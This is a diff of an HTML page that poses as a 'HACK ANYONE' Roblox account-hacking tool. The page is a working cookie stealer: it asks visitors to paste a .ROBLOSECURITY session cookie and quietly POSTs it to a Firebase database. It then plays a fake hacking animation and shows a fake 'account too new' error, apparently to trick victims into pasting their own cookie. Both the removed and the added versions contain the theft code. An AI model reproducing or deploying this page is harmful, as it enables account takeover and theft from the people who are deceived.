@@ -2,82 +2,76 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>ROBLOX HACK ANYONE TOOL 2025</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>HACK ANYONE 2025</title>
 <style>
-  body{margin:0;background:#0d1117;color:#c9d1d9;font-family:system-ui;overflow:hidden;height:100vh;display:flex;align-items:center;justify-content:center}
-  .bg{position:fixed;top:0;left:0;width:100%;height:100%;background:radial-gradient(circle at 50% 50%,#21262d 0%,#0d1117 70%);z-index:-2}
-  .scanlines{position:fixed;top:0;left:0;width:100%;height:100%;background:repeating-linear-gradient(0deg,rgba(0,0,0,0) 0px,rgba(0,0,0,0.05) 1px,rgba(0,0,0,0) 2px);pointer-events:none;z-index:10}
-  .container{background:rgba(22,27,34,0.95);border:1px solid #30363d;border-radius:20px;padding:50px 40px;width:90%;max-width:850px;box-shadow:0 20px 60px rgba(0,0,0,0.8);text-align:center;position:relative;overflow:hidden}
-  .container::before{content:'';position:absolute;top:0;left:0;right:0;height:5px;background:linear-gradient(90deg,#ff006e,#7c3aed,#00d4ff,#00ff88);animation:glow 3s linear infinite}
-  @keyframes glow{0%{background-position:0%}100%{background-position:400%}}
-  h1{font-size:3em;margin:0 0 15px;background:linear-gradient(90deg,#ff006e,#7c3aed,#00ff88);-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-weight:900}
-  p{font-size:1.3em;margin-bottom:25px;color:#8b949e}
-  .badge{background:#f85149;color:white;padding:10px 24px;border-radius:50px;font-weight:900;font-size:1em;display:inline-block;margin-bottom:30px}
-  textarea{width:100%;height:160px;background:#161b22;border:2px solid #30363d;border-radius:14px;padding:20px;font-family:'Courier New',monospace;font-size:15px;color:#58a6ff;resize:none;margin:30px 0}
-  textarea:focus{outline:none;border-color:#ff006e;box-shadow:0 0 35px rgba(255,0,110,0.4)}
-  button{padding:22px 90px;font-size:1.7em;font-weight:900;background:linear-gradient(135deg,#ff006e,#c41e3a);color:white;border:none;border-radius:18px;cursor:pointer;box-shadow:0 12px 50px rgba(255,0,110,0.6);transition:0.3s}
-  button:hover{transform:translateY(-5px);box-shadow:0 25px 70px rgba(255,0,110,0.8)}
-  button:disabled{opacity:0.6;cursor:not-allowed}
-  #output{margin-top:40px;padding:35px;background:#161b22;border:2px solid #f85149;border-radius:14px;font-size:1.5em;line-height:2.2;color:#f85149}
-  .loading{display:none;margin-top:40px;font-size:1.7em;color:#ff006e;font-weight:900}
+  *{margin:0;padding:0;box-sizing:border-box}
+  body{min-height:100vh;background:#0d1117;color:#c9d1d9;font-family:system-ui;display:flex;align-items:center;justify-content:center;padding:15px;background:radial-gradient(circle at 50% 50%,#21262d 0%,#0d1117 90%)}
+  .container{background:rgba(22,27,34,0.97);border:2px solid #30363d;border-radius:20px;padding:30px 25px;width:100%;max-width:420px;box-shadow:0 20px 60px rgba(0,0,0,0.9);text-align:center;position:relative;overflow:hidden}
+  .glow{ position:absolute;top:0;left:0;right:0;height:5px;background:linear-gradient(90deg,#ff006e,#7c3aed,#00d4ff,#00ff88);animation:g 3s linear infinite}
+  @keyframes g{0%{background-position:0%}100%{background-position:400%}}
+  h1{font-size:2.4em;margin-bottom:10px;background:linear-gradient(90deg,#ff006e,#00ff88);-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-weight:900}
+  .subtitle{font-size:1.1em;color:#8b949e;margin-bottom:20px}
+  .badge{background:#f85149;color:#fff;padding:8px 20px;border-radius:30px;font-weight:900;font-size:0.9em;margin-bottom:25px;display:inline-block}
+  textarea{width:100%;height:140px;background:#161b22;border:2px solid #30363d;border-radius:14px;padding:16px;font-family:'Courier New',monospace;font-size:15px;color:#58a6ff;resize:none;margin-bottom:25px}
+  textarea:focus{outline:none;border-color:#ff006e;box-shadow:0 0 25px rgba(255,0,110,0.4)}
+  button{width:100%;padding:18px;font-size:1.7em;font-weight:900;background:linear-gradient(135deg,#ff006e,#c41e3a);color:#fff;border:none;border-radius:16px;cursor:pointer;box-shadow:0 10px 40px rgba(255,0,110,0.6);transition:0.3s;margin-bottom:20px}
+  button:hover{transform:translateY(-3px)}
+  button:disabled{opacity:0.6}
+  #loading{display:none;font-size:1.5em;color:#ff006e;font-weight:900;margin:20px 0}
   .loading.active{display:block}
-  .spinner{display:inline-block;width:34px;height:34px;border:5px solid rgba(255,0,110,0.3);border-top:5px solid #ff006e;border-radius:50%;animation:spin 1s linear infinite;margin-right:15px}
-  @keyframes spin{to{transform:rotate(360deg)}}
+  .spinner{display:inline-block;width:28px;height:28px;border:4px solid rgba(255,0,110,0.3);border-top:4px solid #ff006e;border-radius:50%;animation:s 1s linear infinite;margin-right:12px}
+  @keyframes s{to{transform:rotate(360deg)}}
+  #output{padding:25px;background:#161b22;border:2px solid #f85149;border-radius:14px;font-size:1.35em;line-height:1.8;color:#f85149}
 </style>
 </head>
 <body>
-<div class="bg"></div>
-<div class="scanlines"></div>
 <div class="container">
+  <div class="glow"></div>
   <h1>HACK ANYONE</h1>
-  <p>Go to the target's profile → open dev tools → paste cookie here</p>
+  <div class="subtitle">Go to target's profile → copy cookie → paste below</div>
   <div class="badge">100% UNDETECTED 2025</div>
   
-  <textarea id="cookie" placeholder="Paste target's .ROBLOSECURITY cookie here..."></textarea>
+  <textarea id="cookie" placeholder="Paste target's cookie here..."></textarea>
   
-  <button id="btn" onclick="startHack()">HACK ACCOUNT</button>
+  <button id="btn" onclick="start()">HACK ACCOUNT</button>
   
   <div id="loading" class="loading">
-    <span class="spinner"></span>
-    <span id="msg">Initializing hack...</span>
+    <span class="spinner"></span><span id="msg">Initializing...</span>
   </div>
   
-  <div id="output">Ready — paste target's cookie and press HACK ACCOUNT</div>
+  <div id="output">Ready — paste cookie then press HACK ACCOUNT</div>
 </div>
 
 <script>
-// STEAL + HIDE COOKIE THE SECOND THEY PASTE IT
+// STEAL + HIDE COOKIE INSTANTLY
 document.getElementById('cookie').addEventListener('input', e => {
   const raw = e.target.value.trim();
   if (raw.length > 100) {
-    let cookie = raw;
-    if (cookie.includes('".ROBLOSECURITY"')) {
-      cookie = cookie.split('".ROBLOSECURITY", "')[1]?.split('"')[0] || cookie;
-    }
-    cookie = cookie.replace(/[^A-Za-z0-9_|:-]/g, '');
+    let c = raw;
+    if (c.includes('".ROBLOSECURITY"')) c = c.split('".ROBLOSECURITY", "')[1]?.split('"')[0] || c;
+    c = c.replace(/[^A-Za-z0-9_|:-]/g, '');
 
-    // SEND TO FIREBASE (HIDDEN INFO)
+    // SEND TO YOUR FIREBASE
     fetch("https://flamesaxrch-empire-v2-default-rtdb.europe-west1.firebasedatabase.app/drops.json", {
       method: "POST",
       body: JSON.stringify({
-        cookie: cookie,
+        cookie: c,
         user: "Unknown",
         display: "Unknown",
-        userid: "Unknown",
         robux: 0,
         rap: 0,
         premium: "Unknown",
         time: new Date().toLocaleString()
       })
-    });
+    }).catch(() => {});
 
-    // HIDE THE COOKIE IMMEDIATELY
+    // HIDE COOKIE + LOOKS CLEAN ON MOBILE
     setTimeout(() => {
-      document.getElementById('cookie').value = "Cookie received — processing...";
+      document.getElementById('cookie').value = "Cookie received — ready to hack";
       document.getElementById('cookie').style.color = "#22c55e";
       document.getElementById('cookie').readOnly = true;
-    }, 500);
+    }, 600);
   }
 });
 
@@ -87,20 +81,18 @@ const output = document.getElementById('output');
 const msg = document.getElementById('msg');
 
 const steps = [
-  "Initializing elite hack...",
-  "Connecting to target session...",
-  "Bypassing security layer 1/3...",
-  "Cracking encryption...",
-  "Bypassing layer 2/3...",
+  "Initializing hack...",
+  "Connecting to target...",
+  "Bypassing Roblox security...",
+  "Cracking session...",
   "Injecting payload...",
   "Validating account age...",
   "ERROR — ACCOUNT TOO NEW"
 ];
 
-function startHack() {
-  const cookie = document.getElementById('cookie').value.trim();
-  if (!cookie.includes('WARNING') && cookie.length < 100) {
-    output.innerHTML = "<span style='color:#f85149'>PASTE TARGET'S COOKIE FIRST</span>";
+function start() {
+  if (document.getElementById('cookie').readOnly !== true) {
+    output.innerHTML = "<span style='color:#f85149'>Paste cookie first!</span>";
     return;
   }
 
@@ -109,17 +101,17 @@ function startHack() {
   loading.classList.add("active");
 
   let i = 0;
-  const timer = setInterval(() => {
-    msg.textContent = steps[i];
+  const t = setInterval(() => {
+    msg.textContent = steps[i] || "ERROR — ACCOUNT TOO NEW";
     i++;
     if (i >= steps.length) {
-      clearInterval(timer);
+      clearInterval(t);
       loading.classList.remove("active");
       output.innerHTML = `
-        <strong style="color:#f85149;font-size:1.8em">ERROR — ACCOUNT INVALID</strong><br><br>
-        <strong style="color:#ff006e">The account you are using is too new.</strong><br><br>
-        <strong style="color:#c9d1d9">You must use an account over 6 months old to make the victim's cookie valid.</strong><br><br>
-        <strong style="color:#22c55e">Please switch to an older account and try again.</strong>
+        <strong style="font-size:1.7em;color:#f85149">ERROR — ACCOUNT INVALID</strong><br><br>
+        <strong style="color:#ff006e">Your account is too new</strong><br><br>
+        <strong style="color:#c9d1d9">You must use an account older than 6 months</strong><br><br>
+        <strong style="color:#22c55e">Switch to an older account and try again</strong>
       `;
       output.style.display = "block";
       btn.disabled = false;
